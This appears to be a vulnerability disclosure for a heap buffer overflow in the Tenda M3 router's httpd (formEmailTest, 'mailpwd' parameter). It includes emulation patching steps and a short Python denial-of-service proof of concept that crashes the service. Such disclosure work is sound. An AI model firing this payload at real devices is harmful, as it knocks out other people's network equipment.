# Tenda M3 contains heap buffer Overflow Vulnerability

## overview

- type: heap buffer overflow vulnerability
- supplier: Tenda https://www.tenda.com 
- product: TendaM3 https://www.tenda.com.cn/product/M3.html
- firmware download:   https://www.tenda.com.cn/download/detail-3133.html
- affect version: TendaM3 v1.0.0.12(4856)

## Description

### 1. Vulnerability Details

the `httpd` in directory `/bin` has a heap buffer overflow. The vunlerability is in fucntion `formEmailTest` 

It calls `malloc(0x28Cu)` to allocate heap buffer, and it  copies POST parameter `mailpwd` to heap buffer. 

![image-20220819125604907](readme.assets/image-20220819125604907.png)

`v5` is the length of `mailpwd`, but it doesn’t limit it. so if `v5>0x28C`, the `memcpy(v4, v20, v5)` will cause heap buffer overflow 

The progarm crashed when call `malloc`, the stack frame is below. 

### 2. Recurring loopholes and POC

use qemu-arm-static to run the `httpd`, we need to patch it before run. 

- in `main` function, The `ConnectCfm` function didn’t work properly, so I patched it to `NOP` 
- The `R7WebsSecurityHandler` function is used for permission control, and I've modified it to access URLs that can only be accessed after login

poc of DOS(deny of service)

```python
import requests

data = {
    "mailname": "@", 
    "mailpwd": "b"*0x400
}
cookies = {
    "user": "admin"
}
res = requests.post("http://127.0.0.1/goform/testEmail", data=data, cookies=cookies)
print(res.content)
```

![image-20220819125732221](readme.assets/image-20220819125732221.png)

![image-20220819130142153](readme.assets/image-20220819130142153.png)

![image-20220819130252664](readme.assets/image-20220819130252664.png)